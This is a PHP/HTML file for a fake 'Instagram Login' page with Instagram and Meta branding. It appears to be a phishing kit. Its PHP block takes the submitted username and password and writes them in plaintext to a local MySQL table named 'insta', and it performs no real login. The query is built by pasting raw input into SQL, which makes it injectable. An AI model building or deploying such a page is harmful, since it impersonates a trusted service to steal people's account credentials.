<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://kit.fontawesome.com/7d5794cdae.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
 
    <div class="login-container">
        
        <div class="language">
            <span>English (UK)</span>
        </div>
        <div class="logo">
            <i class="fa-brands fa-instagram" style="font-size: 30px; margin-top: 30px;margin-bottom: 30px; color:  rgb(254, 218, 119)  ;"></i>
            
        </div>
        <form class="login-form" action="" method="post" >
            <input type="text" id="username" name="username" placeholder="Username, email address or mobile num..." class="input-field" >
            <input type="password" id="password" name="password" placeholder="Password" class="input-field" >
            <div id="trigger" ></div>
           

            <button type="submit" name="submit" class="login-button" onclick='fun(this)'>Log in</button>
             
        </form>
        <a href="#" class="forgot-password">Forgotten Password?</a>
        <button class="create-account">Create new account</button>
        <div class="meta-logo">
            <i class="fa-brands fa-meta" style="font-size: 10px; margin-top: 20px;">Meta</i>
        </div>
    </div>
    
</body>

 <?php

$conn=mysqli_connect("localhost","root","","instagram") or die("connection failed");


        if(isset($_POST['submit'])){
        $username=$_POST['username'];
        $password=$_POST['password'];


                if($username!=null){
                    if($password!=null){
                        $sql="INSERT INTO insta (username,password) VALUES ('$username','$password') ";
                        $data= mysqli_query($conn,$sql) or die("query failed");
                    }else{
                        '<script>alert("Enter Password")</script>';
                    }
                }else{
                    '<script>alert("Enter Username")</script>';

                }
            
               
                //    ' <script>alert("hello")</script>';
                    // '<script>document.getElementById("trigger").innerHtml="please Enter Correct Username and Password";</script>';
                    // '<script>document.getElementById("trigger").style=red";</script>';
                
              
    
     }
   

?>  
<script src="ja.js"></script>
</html>